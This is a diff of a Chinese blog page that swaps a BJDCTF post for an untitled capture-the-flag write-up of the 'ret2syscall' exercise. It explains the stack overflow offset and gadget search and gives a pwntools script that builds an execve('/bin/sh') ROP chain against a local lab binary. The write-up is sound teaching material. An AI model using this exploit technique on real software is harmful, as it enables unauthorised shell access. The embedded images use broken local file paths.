@@ -146,7 +146,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2023/12/29/BJDCTF-2020-babyrop2/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/12/29/ret2syscall/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -160,7 +160,7 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2023/12/29/BJDCTF-2020-babyrop2/" class="post-title-link" itemprop="url">[BJDCTF 2020]babyrop2</a>
+            <a href="/2023/12/29/ret2syscall/" class="post-title-link" itemprop="url">未命名</a>
         </h2>
 
         <div class="post-meta">
@@ -170,8 +170,15 @@
               </span>
               <span class="post-meta-item-text">发表于</span>
 
-              <time title="创建时间：2023-12-29 15:55:30" itemprop="dateCreated datePublished" datetime="2023-12-29T15:55:30+08:00">2023-12-29</time>
+              <time title="创建时间：2023-12-29 20:32:44" itemprop="dateCreated datePublished" datetime="2023-12-29T20:32:44+08:00">2023-12-29</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-04-13 21:06:51" itemprop="dateModified" datetime="2023-04-13T21:06:51+08:00">2023-04-13</time>
+              </span>
 
           
 
@@ -184,7 +191,28 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          
+          <h2 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h2><p>拿到附件检查一下保护，拿到ida中打开</p>
+<p>![](C:\Users\lenovo\Desktop\pwn’s wp\ret2syscall\1.png)</p>
+<p>![](C:\Users\lenovo\Desktop\pwn’s wp\ret2syscall\2.png)</p>
+<p>将断点下到call函数，此时ESP，EBP地址通过v4的相对索引可以推算出v4的空间，为108，+4为112</p>
+<p>![](C:\Users\lenovo\Desktop\pwn’s wp\ret2syscall\3.png)</p>
+<p>发现代码有‘&#x2F;bin&#x2F;sh’，可以用execve()系统函数调用</p>
+<p>该程序是 32 位，所以我们需要使得</p>
+<p>系统调用号，即 eax 应该为 0xb<br>第一个参数，即 ebx 应该指向 &#x2F;bin&#x2F;sh 的地址，其实执行 sh 的地址也可以。<br>第二个参数，即 ecx 应该为 0<br>第三个参数，即 edx 应该为 0<br>而我们如何控制这些寄存器的值 呢？这里就需要使用 gadgets。比如说，现在栈顶是 10，那么如果此时执行了 pop eax，那么现在 eax 的值就为 10。但是我们并不能期待有一段连续的代码可以同时控制对应的寄存器，所以我们需要一段一段控制，这也是我们在 gadgets 最后使用 ret 来再次控制程序执行流程的原因。具体寻找 gadgets 的方法，我们可以使用 ropgadgets 这个工具。</p>
+<p>![](C:\Users\lenovo\Desktop\pwn’s wp\ret2syscall\4.png)</p>
+<p>eax地址选择为 0x080bb196</p>
+<p>![](C:\Users\lenovo\Desktop\pwn’s wp\ret2syscall\5.png)</p>
+<p>选择0x0806eb90控制edx,ecx,ebx ret</p>
+<p>![](C:\Users\lenovo\Desktop\pwn’s wp\ret2syscall\6.png)</p>
+<p>找到字符出地址，该程序为32位，系统调用号为0xb，int_0x80来触发execve()系统调用</p>
+<p>找到int_0x80地址</p>
+<p>![](C:\Users\lenovo\Desktop\pwn’s wp\ret2syscall\7.png)</p>
+<p>所有地址都找到了，开始构造exp</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">from</span> pwn import *</span><br><span class="line"><span class="attribute">p</span> = process(&#x27;./rop&#x27;)</span><br><span class="line"><span class="attribute">pop_eax_ret</span> = <span class="number">0</span>x080bb196</span><br><span class="line"><span class="attribute">pop_edx_ecx_ebx_ret</span> = <span class="number">0</span>x0806eb90</span><br><span class="line"><span class="attribute">bin_sh</span> = <span class="number">0</span>x080be408</span><br><span class="line"><span class="attribute">int_0x80</span> = <span class="number">0</span>x08049421</span><br><span class="line"><span class="attribute">payload</span> = flat(b&#x27;a&#x27;*<span class="number">112</span>,pop_eax_ret,<span class="number">0</span>xb,pop_edx_ecx_ebx_ret,<span class="number">0</span>,<span class="number">0</span>,bin_sh,int_0x80)</span><br><span class="line"><span class="attribute">p</span>.sendline(payload)</span><br><span class="line"><span class="attribute">p</span>.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>通过此题更深一步了解了栈溢出</p>
+<p>并且学会了ROPgadgets的使用</p>
+
       
     </div>
 
